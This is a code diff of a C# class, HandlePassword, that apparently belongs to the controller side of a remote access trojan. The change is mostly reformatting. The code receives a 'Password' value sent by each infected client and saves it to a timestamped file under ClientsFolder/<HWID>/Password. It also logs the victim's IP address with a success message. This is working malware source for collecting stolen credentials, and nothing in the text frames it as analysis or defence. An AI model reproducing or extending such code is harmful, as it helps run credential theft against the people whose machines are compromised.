@@ -1,28 +1,27 @@
-﻿using Server.Connection;
-using Server.MessagePack;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Drawing;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
+using Server.Connection;
+using Server.MessagePack;
 
 namespace Server.Handle_Packet
 {
-    class HandlePassword
+    internal class HandlePassword
     {
         public void SavePassword(Clients client, MsgPack unpack_msgpack)
         {
             try
             {
-                string password = unpack_msgpack.ForcePathObject("Password").GetAsString();
-                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("Hwid").AsString + "\\Password");
+                var password = unpack_msgpack.ForcePathObject("Password").GetAsString();
+                var fullPath = Path.Combine(Application.StartupPath,
+                    "ClientsFolder\\" + unpack_msgpack.ForcePathObject("Hwid").AsString + "\\Password");
                 if (!Directory.Exists(fullPath))
                     Directory.CreateDirectory(fullPath);
                 File.WriteAllText(fullPath + $"\\Password_{DateTime.Now:MM-dd-yyyy HH;mm;ss}.txt", password);
-                new HandleLogs().Addmsg($"Client {client.Ip} password saved success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/Password", Color.Purple);
+                new HandleLogs().Addmsg(
+                    $"Client {client.Ip} password saved success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/Password",
+                    Color.Purple);
                 client.Disconnected();
             }
             catch (Exception ex)
